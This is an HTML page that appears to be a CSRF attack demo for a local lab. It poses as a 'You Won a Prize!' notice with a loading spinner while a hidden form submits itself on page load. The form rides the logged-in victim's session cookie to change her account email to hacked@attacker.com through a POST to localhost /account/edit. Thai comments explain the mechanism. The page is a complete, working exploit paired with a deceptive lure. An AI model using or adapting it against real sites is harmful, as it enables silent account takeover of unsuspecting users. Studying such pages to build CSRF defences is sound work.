<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>You Won a Prize! 🎉</title>
  <script src="config.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: white;
    }

    .card {
      text-align: center;
      padding: 3rem;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 16px;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
    }

    p {
      color: #aaa;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 1.5rem auto;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>

<body>
  <div class="card">
    <h1>🎉 Congratulations!</h1>
    <p>You've been selected for a special reward.<br>Please wait while we process your claim...</p>
    <div class="spinner"></div>
    <p id="status">Verifying eligibility...</p>
  </div>

  <!--
    CSRF ATTACK:
    Form นี้ submit อัตโนมัติทันทีที่หน้าโหลด
    ถ้า victim (alice) login อยู่
    browser จะส่ง session cookie ไปด้วยอัตโนมัติ
    → email ของ alice จะถูกเปลี่ยนเป็น hacked@attacker.com
  -->
  <form id="csrf-form" method="POST" action="" style="display:none;">
    <input type="hidden" name="email" value="hacked@attacker.com">
  </form>

  <script>
    // Auto-submit เมื่อโหลดหน้า — victim ไม่รู้ตัว
    var form = document.getElementById('csrf-form');
    // ใช้ TARGET_PORT จาก config.js
    var port = (typeof TARGET_PORT !== 'undefined') ? TARGET_PORT : 5000;
    form.action = "http://localhost:" + port + "/account/edit";
    form.submit();

    setTimeout(function () {
      document.getElementById('status').textContent = 'Done! Redirecting...';
    }, 800);
  </script>
</body>

</html>
